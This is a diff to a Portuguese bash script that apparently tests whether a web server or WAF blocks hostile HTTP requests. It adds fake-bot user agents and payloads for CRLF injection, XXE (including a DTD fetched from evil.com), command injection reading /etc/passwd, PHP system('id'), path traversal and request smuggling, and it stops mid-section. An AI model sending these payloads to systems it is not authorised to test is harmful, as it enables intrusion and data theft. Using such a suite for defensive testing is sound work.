@@ -1,12 +1,12 @@
 #!/bin/bash
 #==============================================================================
 # HTTP Header Security Testing Suite - EXPANDED VERSION
-# Versão: 3.0.0
+# Versão: 3.1.0
 # Descrição: Script abrangente para testes de segurança de cabeçalhos HTTP
 #==============================================================================
 
 set -uo pipefail
-VERSION="3.0.0"
+VERSION="3.1.0"
 
 # Cores
 RED='\033[0;31m'
@@ -30,17 +30,38 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
 # User-Agents disponíveis
 USER_AGENTS=(
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/134.0.0.0 Safari/537.36"
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/134.0.0.0 Safari/537.36"
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1"
+    # Desktop - Chrome
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+    # Desktop - Firefox
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0"
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0"
+    # Desktop - Safari
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15"
+    # Desktop - Edge
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
+    # Mobile - iPhone
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
+    # Mobile - Android Chrome
+    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36"
+    # Mobile - Android Samsung
+    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/134.0.0.0 Mobile Safari/537.36"
+    # Tablet - iPad
+    "Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
+    # Desktop - Opera
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 OPR/110.0.0.0"
+    # Desktop - Brave
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Brave/134"
+    # Desktop - Vivaldi
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Vivaldi/6.5.3206.63"
 )
 
 show_banner() {
     echo -e "${CYAN}"
     echo "╔═══════════════════════════════════════════════════════════════════════════╗"
-    echo "║          HTTP Header Security Testing Suite v${VERSION} - EXPANDED            ║"
+    echo "║          HTTP Header Security Testing Suite v${VERSION} - EXPANDED        ║"
     echo "║                     500+ Security Tests Available                         ║"
     echo "╚═══════════════════════════════════════════════════════════════════════════╝"
     echo -e "${NC}"
@@ -53,7 +74,9 @@ test_curl() {
     
     TOTAL_TESTS=$((TOTAL_TESTS + 1))
     local response
-    response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$@" 2>/dev/null || echo "000")
+    response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$@" 2>/dev/null)
+    # Se curl falhar ou retornar vazio, usar 000
+    [[ -z "$response" ]] && response="000"
     
     local status_icon color result_text
     
@@ -328,6 +351,38 @@ test_good_bots() {
     test_curl "Bingbot" "allow" -Lk -A "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "$URL"
     test_curl "DuckDuckBot" "allow" -Lk -A "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)" "$URL"
     test_curl "Facebot" "allow" -Lk -A "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "$URL"
+    test_curl "Twitterbot" "allow" -Lk -A "Twitterbot/1.0" "$URL"
+    test_curl "LinkedInBot" "allow" -Lk -A "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)" "$URL"
+    test_curl "Slackbot" "allow" -Lk -A "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)" "$URL"
+    test_curl "WhatsApp" "allow" -Lk -A "WhatsApp/2.23.20.0" "$URL"
+    test_curl "Telegrambot" "allow" -Lk -A "TelegramBot (like TwitterBot)" "$URL"
+}
+
+#==============================================================================
+# FAKE BOTS - Bots que se passam por Google/Bing (devem ser BLOQUEADOS)
+#==============================================================================
+test_fake_bots() {
+    print_section "🎭 TESTES DE FAKE BOTS (Impostores - devem ser BLOQUEADOS)"
+    
+    echo -e "  ${YELLOW}ℹ️  Estes são bots FALSOS que tentam se passar por crawlers legítimos${NC}"
+    echo -e "  ${YELLOW}   Servidores bem configurados devem verificar o IP de origem e bloquear${NC}"
+    echo ""
+    
+    # Fake Googlebot - usando User-Agent real mas de IP não autorizado
+    test_curl "FAKE Googlebot Mobile" "block" -Lk -A "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$URL"
+    test_curl "FAKE Googlebot Desktop" "block" -Lk -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$URL"
+    test_curl "FAKE Googlebot-Image" "block" -Lk -A "Googlebot-Image/1.0" "$URL"
+    test_curl "FAKE Googlebot-News" "block" -Lk -A "Googlebot-News" "$URL"
+    test_curl "FAKE Googlebot-Video" "block" -Lk -A "Googlebot-Video/1.0" "$URL"
+    
+    # Fake Bingbot
+    test_curl "FAKE Bingbot" "block" -Lk -A "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "$URL"
+    test_curl "FAKE Bingbot Mobile" "block" -Lk -A "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "$URL"
+    test_curl "FAKE MSNBot" "block" -Lk -A "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "$URL"
+    
+    # Fake outros bots famosos
+    test_curl "FAKE YandexBot" "block" -Lk -A "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "$URL"
+    test_curl "FAKE Baiduspider" "block" -Lk -A "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "$URL"
 }
 
 #==============================================================================
@@ -427,108 +482,345 @@ test_malicious_uri() {
 # HEADER INJECTION (10 testes)
 #==============================================================================
 test_header_injection() {
-    print_section "💉 TESTES DE HEADER INJECTION (10 testes)"
+    print_section "💉 TESTES DE HEADER INJECTION (20 testes)"
     
-    test_curl "CRLF: Injeção básica" "block" -A "$UA" -Lk -H $'X-Custom: test\r\nX-Injected: hacked' "$URL"
-    test_curl "CRLF: Set-Cookie injection" "block" -A "$UA" -Lk -H $'X-Test: test\r\nSet-Cookie: hacked=true' "$URL"
+    print_subsection "CRLF Injection"
+    test_curl "CRLF: Básico" "block" -A "$UA" -Lk -H $'X-Custom: test\r\nX-Injected: hacked' "$URL"
+    test_curl "CRLF: Set-Cookie" "block" -A "$UA" -Lk -H $'X-Test: test\r\nSet-Cookie: admin=true' "$URL"
+    test_curl "CRLF: Location redirect" "block" -A "$UA" -Lk -H $'X-Test: test\r\nLocation: http://evil.com' "$URL"
+    test_curl "CRLF: Content-Type" "block" -A "$UA" -Lk -H $'X-Test: test\r\nContent-Type: text/html' "$URL"
+    test_curl "CRLF: Double CRLF (body)" "block" -A "$UA" -Lk -H $'X-Test: test\r\n\r\n<html>injected</html>' "$URL"
+    
+    print_subsection "Header Override Attacks"
     test_curl "X-Forwarded-Host: evil.com" "block" -A "$UA" -Lk -H "X-Forwarded-Host: evil.com" "$URL"
+    test_curl "X-Forwarded-Proto: http" "block" -A "$UA" -Lk -H "X-Forwarded-Proto: http" "$URL"
     test_curl "X-Original-URL: /admin" "block" -A "$UA" -Lk -H "X-Original-URL: /admin" "$URL"
     test_curl "X-Rewrite-URL: /admin" "block" -A "$UA" -Lk -H "X-Rewrite-URL: /admin" "$URL"
     test_curl "X-HTTP-Method-Override: DELETE" "block" -A "$UA" -Lk -H "X-HTTP-Method-Override: DELETE" "$URL"
     test_curl "X-HTTP-Method-Override: PUT" "block" -A "$UA" -Lk -H "X-HTTP-Method-Override: PUT" "$URL"
-    test_curl "Header com SQL Injection" "block" -A "$UA" -Lk -H "X-Custom: ' OR '1'='1" "$URL"
-    test_curl "Header com XSS" "block" -A "$UA" -Lk -H "X-Custom: <script>alert(1)</script>" "$URL"
-    test_curl "Header com null byte" "block" -A "$UA" -Lk -H "X-Custom: admin%00" "$URL"
+    test_curl "X-HTTP-Method-Override: TRACE" "block" -A "$UA" -Lk -H "X-HTTP-Method-Override: TRACE" "$URL"
+    
+    print_subsection "Payloads em Headers"
+    test_curl "Header: SQL Injection" "block" -A "$UA" -Lk -H "X-Custom: ' OR '1'='1" "$URL"
+    test_curl "Header: XSS" "block" -A "$UA" -Lk -H "X-Custom: <script>alert(1)</script>" "$URL"
+    test_curl "Header: Null byte" "block" -A "$UA" -Lk -H "X-Custom: admin%00" "$URL"
+    test_curl "Header: Path traversal" "block" -A "$UA" -Lk -H "X-Custom: ../../etc/passwd" "$URL"
+    test_curl "Header: Command injection" "block" -A "$UA" -Lk -H "X-Custom: ;cat /etc/passwd" "$URL"
+    test_curl "Header: Template injection" "block" -A "$UA" -Lk -H "X-Custom: {{7*7}}" "$URL"
+    test_curl "Header: Muito longo (8KB)" "block" -A "$UA" -Lk -H "X-Long: $(head -c 8000 /dev/zero | tr '\0' 'A')" "$URL"
 }
 
 #==============================================================================
-# CONTENT-TYPE ATTACKS (10 testes)
+# CONTENT-TYPE ATTACKS (20 testes)
 #==============================================================================
 test_content_type() {
-    print_section "📄 TESTES DE CONTENT-TYPE ATTACKS (10 testes)"
+    print_section "📄 TESTES DE CONTENT-TYPE ATTACKS (20 testes)"
     
-    test_curl "CT: XXE via XML" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "$URL"
-    test_curl "CT: XSS via SVG" "block" -A "$UA" -Lk -H "Content-Type: image/svg+xml" -d '<svg onload="alert(1)">' "$URL"
+    print_subsection "XXE e XML Attacks"
+    test_curl "CT: XXE básico" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "$URL"
+    test_curl "CT: XXE com DTD externa" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd"><foo></foo>' "$URL"
+    test_curl "CT: XXE parameter entity" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>' "$URL"
+    test_curl "CT: SOAP injection" "block" -A "$UA" -Lk -H "Content-Type: application/soap+xml" -d '<?xml version="1.0"?><soap:Envelope><soap:Body><x>test</x></soap:Body></soap:Envelope>' "$URL"
+    
+    print_subsection "XSS via Content-Type"
+    test_curl "CT: SVG XSS" "block" -A "$UA" -Lk -H "Content-Type: image/svg+xml" -d '<svg onload="alert(1)">' "$URL"
+    test_curl "CT: HTML XSS" "block" -A "$UA" -Lk -H "Content-Type: text/html" -d "<script>alert(1)</script>" "$URL"
+    test_curl "CT: XHTML XSS" "block" -A "$UA" -Lk -H "Content-Type: application/xhtml+xml" -d '<html><script>alert(1)</script></html>' "$URL"
+    
+    print_subsection "Charset e Encoding Attacks"
     test_curl "CT: UTF-7 charset" "block" -A "$UA" -Lk -H "Content-Type: text/html; charset=UTF-7" "$URL"
-    test_curl "CT: text/html com XSS" "block" -A "$UA" -Lk -H "Content-Type: text/html" -d "<script>alert(1)</script>" "$URL"
+    test_curl "CT: UTF-32 charset" "block" -A "$UA" -Lk -H "Content-Type: text/html; charset=UTF-32" "$URL"
+    test_curl "CT: ISO-2022-JP" "block" -A "$UA" -Lk -H "Content-Type: text/html; charset=ISO-2022-JP" "$URL"
+    
+    print_subsection "MIME Type Confusion"
     test_curl "CT: multipart sem boundary" "block" -A "$UA" -Lk -H "Content-Type: multipart/form-data" "$URL"
-    test_curl "CT: SQLi em form" "block" -A "$UA" -Lk -H "Content-Type: application/x-www-form-urlencoded" -d "user=admin' OR 1=1--" "$URL"
-    test_curl "CT: tipo inexistente" "block" -A "$UA" -Lk -H "Content-Type: evil/payload" "$URL"
-    test_curl "CT: CRLF em Content-Type" "block" -A "$UA" -Lk -H $'Content-Type: text/html\r\nX-Injected: true' "$URL"
     test_curl "CT: application/x-httpd-php" "block" -A "$UA" -Lk -H "Content-Type: application/x-httpd-php" -d "<?php system('id'); ?>" "$URL"
+    test_curl "CT: tipo inexistente" "block" -A "$UA" -Lk -H "Content-Type: evil/payload" "$URL"
+    test_curl "CT: application/octet-stream" "block" -A "$UA" -Lk -H "Content-Type: application/octet-stream" -d "malicious binary" "$URL"
+    test_curl "CT: text/x-php" "block" -A "$UA" -Lk -H "Content-Type: text/x-php" "$URL"
+    
+    print_subsection "Payload Injection"
+    test_curl "CT: SQLi em form" "block" -A "$UA" -Lk -H "Content-Type: application/x-www-form-urlencoded" -d "user=admin' OR 1=1--" "$URL"
+    test_curl "CT: JSON SQLi" "block" -A "$UA" -Lk -H "Content-Type: application/json" -d '{"user":"admin\u0027 OR 1=1--"}' "$URL"
+    test_curl "CT: CRLF em Content-Type" "block" -A "$UA" -Lk -H $'Content-Type: text/html\r\nX-Injected: true' "$URL"
     test_curl "CT: muito longo" "block" -A "$UA" -Lk -H "Content-Type: text/$(head -c 1000 /dev/zero | tr '\0' 'A')" "$URL"
 }
 
 #==============================================================================
-# ACCEPT-ENCODING ATTACKS (10 testes)
+# ACCEPT-ENCODING ATTACKS (20 testes)
 #==============================================================================
 test_accept_encoding() {
-    print_section "🗜️ TESTES DE ACCEPT-ENCODING ATTACKS (10 testes)"
+    print_section "🗜️ TESTES DE ACCEPT-ENCODING ATTACKS (20 testes)"
     
-    test_curl "AE: muitos encodings" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip, deflate, br, compress, identity, *, sdch, xz, lzma" "$URL"
-    test_curl "AE: encoding inválido XSS" "block" -A "$UA" -Lk -H "Accept-Encoding: <script>alert(1)</script>" "$URL"
-    test_curl "AE: SQL Injection" "block" -A "$UA" -Lk -H "Accept-Encoding: ' OR 1=1--" "$URL"
-    test_curl "AE: encoding repetido" "block" -A "$UA" -Lk -H "Accept-Encoding: $(printf 'gzip,%.0s' {1..100})" "$URL"
+    print_subsection "Encoding Manipulation"
+    test_curl "AE: muitos encodings" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip, deflate, br, compress, identity, *, sdch, xz, lzma, zstd" "$URL"
+    test_curl "AE: encoding repetido x100" "block" -A "$UA" -Lk -H "Accept-Encoding: $(printf 'gzip,%.0s' {1..100})" "$URL"
+    test_curl "AE: encoding repetido x500" "block" -A "$UA" -Lk -H "Accept-Encoding: $(printf 'deflate,%.0s' {1..500})" "$URL"
     test_curl "AE: chunked (smuggling)" "block" -A "$UA" -Lk -H "Accept-Encoding: chunked" "$URL"
+    test_curl "AE: transfer-encoding em AE" "block" -A "$UA" -Lk -H "Accept-Encoding: chunked, gzip" "$URL"
+    
+    print_subsection "Payload Injection em AE"
+    test_curl "AE: XSS" "block" -A "$UA" -Lk -H "Accept-Encoding: <script>alert(1)</script>" "$URL"
+    test_curl "AE: SQL Injection" "block" -A "$UA" -Lk -H "Accept-Encoding: ' OR 1=1--" "$URL"
+    test_curl "AE: path traversal" "block" -A "$UA" -Lk -H "Accept-Encoding: ../../etc/passwd" "$URL"
+    test_curl "AE: command injection" "block" -A "$UA" -Lk -H "Accept-Encoding: ;cat /etc/passwd" "$URL"
     test_curl "AE: null byte" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip%00deflate" "$URL"
+    
+    print_subsection "CRLF e Malformed"
     test_curl "AE: CRLF injection" "block" -A "$UA" -Lk -H $'Accept-Encoding: gzip\r\nX-Injected: true' "$URL"
     test_curl "AE: encoding inexistente" "block" -A "$UA" -Lk -H "Accept-Encoding: evil-encoding-doom" "$URL"
-    test_curl "AE: muito longo" "block" -A "$UA" -Lk -H "Accept-Encoding: $(head -c 2000 /dev/zero | tr '\0' 'A')" "$URL"
-    test_curl "AE: caracteres especiais" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip; q=1.0, *; q=0.5, ../../etc/passwd" "$URL"
+    test_curl "AE: q-value malicioso" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip; q=99999999" "$URL"
+    test_curl "AE: q-value negativo" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip; q=-1" "$URL"
+    test_curl "AE: caracteres especiais" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip; q=<script>" "$URL"
+    
+    print_subsection "Overflow"
+    test_curl "AE: 2KB" "block" -A "$UA" -Lk -H "Accept-Encoding: $(head -c 2000 /dev/zero | tr '\0' 'A')" "$URL"
+    test_curl "AE: 4KB" "block" -A "$UA" -Lk -H "Accept-Encoding: $(head -c 4000 /dev/zero | tr '\0' 'B')" "$URL"
+    test_curl "AE: 8KB" "block" -A "$UA" -Lk -H "Accept-Encoding: $(head -c 8000 /dev/zero | tr '\0' 'C')" "$URL"
+    test_curl "AE: com wildcards" "block" -A "$UA" -Lk -H "Accept-Encoding: *, gzip;q=0, deflate;q=0" "$URL"
+    test_curl "AE: identity negado" "block" -A "$UA" -Lk -H "Accept-Encoding: identity;q=0, *;q=0" "$URL"
 }
 
 #==============================================================================
-# X-FORWARDED-FOR SPOOFING (10 testes)
+# X-FORWARDED-FOR SPOOFING (20 testes)
 #==============================================================================
 test_xff_spoofing() {
-    print_section "🌐 TESTES DE X-FORWARDED-FOR SPOOFING (10 testes)"
+    print_section "🌐 TESTES DE X-FORWARDED-FOR SPOOFING (20 testes)"
     
+    print_subsection "IP Privado/Local"
     test_curl "XFF: 127.0.0.1" "block" -A "$UA" -Lk -H "X-Forwarded-For: 127.0.0.1" "$URL"
     test_curl "XFF: localhost" "block" -A "$UA" -Lk -H "X-Forwarded-For: localhost" "$URL"
     test_curl "XFF: 192.168.1.1" "block" -A "$UA" -Lk -H "X-Forwarded-For: 192.168.1.1" "$URL"
     test_curl "XFF: 10.0.0.1" "block" -A "$UA" -Lk -H "X-Forwarded-For: 10.0.0.1" "$URL"
+    test_curl "XFF: 172.16.0.1" "block" -A "$UA" -Lk -H "X-Forwarded-For: 172.16.0.1" "$URL"
+    test_curl "XFF: ::1 (IPv6)" "block" -A "$UA" -Lk -H "X-Forwarded-For: ::1" "$URL"
+    test_curl "XFF: 0.0.0.0" "block" -A "$UA" -Lk -H "X-Forwarded-For: 0.0.0.0" "$URL"
+    
+    print_subsection "Cloud Metadata IPs"
     test_curl "XFF: 169.254.169.254 (AWS)" "block" -A "$UA" -Lk -H "X-Forwarded-For: 169.254.169.254" "$URL"
+    test_curl "XFF: 169.254.170.2 (AWS ECS)" "block" -A "$UA" -Lk -H "X-Forwarded-For: 169.254.170.2" "$URL"
+    test_curl "XFF: 100.100.100.200 (Alibaba)" "block" -A "$UA" -Lk -H "X-Forwarded-For: 100.100.100.200" "$URL"
+    
+    print_subsection "Payload Injection"
     test_curl "XFF: SQL Injection" "block" -A "$UA" -Lk -H "X-Forwarded-For: ' OR 1=1--" "$URL"
     test_curl "XFF: XSS" "block" -A "$UA" -Lk -H "X-Forwarded-For: <script>alert(1)</script>" "$URL"
-    test_curl "XFF: múltiplos IPs forjados" "block" -A "$UA" -Lk -H "X-Forwarded-For: 8.8.8.8, 127.0.0.1, 192.168.1.1" "$URL"
+    test_curl "XFF: Command injection" "block" -A "$UA" -Lk -H "X-Forwarded-For: ;cat /etc/passwd" "$URL"
+    test_curl "XFF: CRLF injection" "block" -A "$UA" -Lk -H $'X-Forwarded-For: 1.2.3.4\r\nX-Injected: true' "$URL"
+    
+    print_subsection "Multiple IPs e Headers Alternativos"
+    test_curl "XFF: múltiplos IPs" "block" -A "$UA" -Lk -H "X-Forwarded-For: 8.8.8.8, 127.0.0.1, 192.168.1.1" "$URL"
     test_curl "X-Real-IP: 127.0.0.1" "block" -A "$UA" -Lk -H "X-Real-IP: 127.0.0.1" "$URL"
     test_curl "X-Client-IP: 192.168.0.1" "block" -A "$UA" -Lk -H "X-Client-IP: 192.168.0.1" "$URL"
+    test_curl "X-Originating-IP: 10.0.0.1" "block" -A "$UA" -Lk -H "X-Originating-IP: 10.0.0.1" "$URL"
+    test_curl "X-Remote-IP: localhost" "block" -A "$UA" -Lk -H "X-Remote-IP: localhost" "$URL"
+    test_curl "X-Remote-Addr: 127.0.0.1" "block" -A "$UA" -Lk -H "X-Remote-Addr: 127.0.0.1" "$URL"
 }
 
 #==============================================================================
-# RANGE HEADER ATTACKS (10 testes)
+# RANGE HEADER ATTACKS (20 testes)
 #==============================================================================
 test_range_header() {
-    print_section "📊 TESTES DE RANGE HEADER ATTACKS (10 testes)"
+    print_section "📊 TESTES DE RANGE HEADER ATTACKS (20 testes)"
     
-    test_curl "Range: múltiplos ranges (DoS)" "block" -A "$UA" -Lk -H "Range: bytes=0-0,1-1,2-2,3-3,4-4,5-5,6-6,7-7,8-8,9-9" "$URL"
+    print_subsection "Range DoS"
+    test_curl "Range: 10 ranges" "block" -A "$UA" -Lk -H "Range: bytes=0-0,1-1,2-2,3-3,4-4,5-5,6-6,7-7,8-8,9-9" "$URL"
+    test_curl "Range: 50 ranges" "block" -A "$UA" -Lk -H "Range: bytes=$(for i in $(seq 0 2 100); do echo -n "$i-$((i+1)),"; done | sed 's/,$//')" "$URL"
+    test_curl "Range: 100 ranges" "block" -A "$UA" -Lk -H "Range: bytes=$(for i in $(seq 0 2 200); do echo -n "$i-$((i+1)),"; done | sed 's/,$//')" "$URL"
+    test_curl "Range: overlapping" "block" -A "$UA" -Lk -H "Range: bytes=0-100,50-150,100-200,150-250" "$URL"
+    
+    print_subsection "Range Malformado"
     test_curl "Range: bytes=-1" "block" -A "$UA" -Lk -H "Range: bytes=-1" "$URL"
     test_curl "Range: muito grande" "block" -A "$UA" -Lk -H "Range: bytes=0-99999999999999999" "$URL"
     test_curl "Range: negativo" "block" -A "$UA" -Lk -H "Range: bytes=-99999999999" "$URL"
     test_curl "Range: invertido" "block" -A "$UA" -Lk -H "Range: bytes=100-0" "$URL"
-    test_curl "Range: overlapping" "block" -A "$UA" -Lk -H "Range: bytes=0-100,50-150,100-200" "$URL"
+    test_curl "Range: sem número" "block" -A "$UA" -Lk -H "Range: bytes=abc-xyz" "$URL"
+    test_curl "Range: formato inválido" "block" -A "$UA" -Lk -H "Range: invalid-format-attack" "$URL"
+    
+    print_subsection "Payload em Range"
     test_curl "Range: XSS" "block" -A "$UA" -Lk -H "Range: bytes=<script>alert(1)</script>" "$URL"
     test_curl "Range: SQL Injection" "block" -A "$UA" -Lk -H "Range: bytes=' OR 1=1--" "$URL"
-    test_curl "Range: 100+ ranges" "block" -A "$UA" -Lk -H "Range: bytes=$(for i in $(seq 0 2 200); do echo -n "$i-$((i+1)),"; done | sed 's/,$//')" "$URL"
-    test_curl "Range: formato inválido" "block" -A "$UA" -Lk -H "Range: invalid-format-attack" "$URL"
+    test_curl "Range: Command injection" "block" -A "$UA" -Lk -H "Range: bytes=;cat /etc/passwd" "$URL"
+    test_curl "Range: Path traversal" "block" -A "$UA" -Lk -H "Range: bytes=../../etc/passwd" "$URL"
+    test_curl "Range: Null byte" "block" -A "$UA" -Lk -H "Range: bytes=0-100%00" "$URL"
+    
+    print_subsection "Range Overflow"
+    test_curl "Range: INT_MAX" "block" -A "$UA" -Lk -H "Range: bytes=0-2147483647" "$URL"
+    test_curl "Range: INT_MAX+1" "block" -A "$UA" -Lk -H "Range: bytes=0-2147483648" "$URL"
+    test_curl "Range: LONG_MAX" "block" -A "$UA" -Lk -H "Range: bytes=0-9223372036854775807" "$URL"
+    test_curl "Range: header muito longo" "block" -A "$UA" -Lk -H "Range: bytes=$(head -c 5000 /dev/zero | tr '\0' '1')" "$URL"
+    test_curl "Range: unidade inválida" "block" -A "$UA" -Lk -H "Range: evil=0-100" "$URL"
 }
 
 #==============================================================================
-# HTTP SMUGGLING ATTACKS (10 testes)
+# HTTP SMUGGLING ATTACKS (20 testes)
 #==============================================================================
 test_http_smuggling() {
-    print_section "🚢 TESTES DE HTTP SMUGGLING (10 testes)"
+    print_section "🚢 TESTES DE HTTP SMUGGLING (20 testes)"
     
+    print_subsection "CL.TE e TE.CL"
     test_curl "Smuggling: CL + TE" "block" -A "$UA" -Lk -H "Content-Length: 0" -H "Transfer-Encoding: chunked" "$URL"
+    test_curl "Smuggling: TE + CL" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -H "Content-Length: 0" "$URL"
+    test_curl "Smuggling: CL duplicado diferente" "block" -A "$UA" -Lk -H "Content-Length: 0" -H "Content-Length: 100" "$URL"
+    test_curl "Smuggling: TE duplicado" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -H "Transfer-Encoding: identity" "$URL"
+    
+    print_subsection "Transfer-Encoding Obfuscation"
     test_curl "Smuggling: TE com espaço" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked " "$URL"
+    test_curl "Smuggling: TE com tab" "block" -A "$UA" -Lk -H $'Transfer-Encoding:\tchunked' "$URL"
     test_curl "Smuggling: TE + identity" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked, identity" "$URL"
+    test_curl "Smuggling: TE com newline" "block" -A "$UA" -Lk -H $'Transfer-Encoding: chunked\n' "$URL"
+    test_curl "Smuggling: TE capitalizado" "block" -A "$UA" -Lk -H "Transfer-Encoding: ChUnKeD" "$URL"
+    test_curl "Smuggling: X-Transfer-Encoding" "block" -A "$UA" -Lk -H "X-Transfer-Encoding: chunked" "$URL"
+    test_curl "Smuggling: Transfer_Encoding" "block" -A "$UA" -Lk -H "Transfer_Encoding: chunked" "$URL"
+    
+    print_subsection "Content-Length Manipulation"
     test_curl "Smuggling: CL negativo" "block" -A "$UA" -Lk -H "Content-Length: -1" "$URL"
     test_curl "Smuggling: CL muito grande" "block" -A "$UA" -Lk -H "Content-Length: 999999999999" "$URL"
-    test_curl "Smuggling: CL duplicado" "block" -A "$UA" -Lk -H "Content-Length: 0" -H "Content-Length: 100" "$URL"
-    test_curl "Smuggling: TE duplicado" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -H "Transfer-Encoding: identity" "$URL"
-    test_curl "Smuggling: TE com tab" "block" -A "$UA" -Lk -H $'Transfer-Encoding:\tchunked' "$URL"
-    test_curl "Smuggling: X-TE header" "block" -A "$UA" -Lk -H "X-Transfer-Encoding: chunked" "$URL"
+    test_curl "Smuggling: CL zero com body" "block" -A "$UA" -Lk -H "Content-Length: 0" -d "hidden data" "$URL"
+    test_curl "Smuggling: CL decimal" "block" -A "$UA" -Lk -H "Content-Length: 10.5" "$URL"
+    test_curl "Smuggling: CL hex" "block" -A "$UA" -Lk -H "Content-Length: 0x10" "$URL"
+    
+    print_subsection "CRLF e Headers Malformados"
     test_curl "Smuggling: TE com CRLF" "block" -A "$UA" -Lk -H $'Transfer-Encoding: chunked\r\n: x' "$URL"
+    test_curl "Smuggling: linha vazia antes" "block" -A "$UA" -Lk -H $'\r\nTransfer-Encoding: chunked' "$URL"
+    test_curl "Smuggling: espaço antes do :" "block" -A "$UA" -Lk -H "Transfer-Encoding : chunked" "$URL"
+    test_curl "Smuggling: múltiplos espaços" "block" -A "$UA" -Lk -H "Transfer-Encoding:    chunked" "$URL"
+}
+
+#==============================================================================
+# NGINX SPECIFIC ATTACKS (20 testes)
+#==============================================================================
+test_nginx_attacks() {
+    print_section "🔧 TESTES DE ATAQUES AO NGINX (20 testes)"
+    
+    print_subsection "Path Traversal e Alias"
+    test_curl "Nginx: path traversal básico" "block" -A "$UA" -Lk "${URL}/../../../etc/passwd"
+    test_curl "Nginx: path traversal encoded" "block" -A "$UA" -Lk "${URL}/..%2f..%2f..%2fetc/passwd"
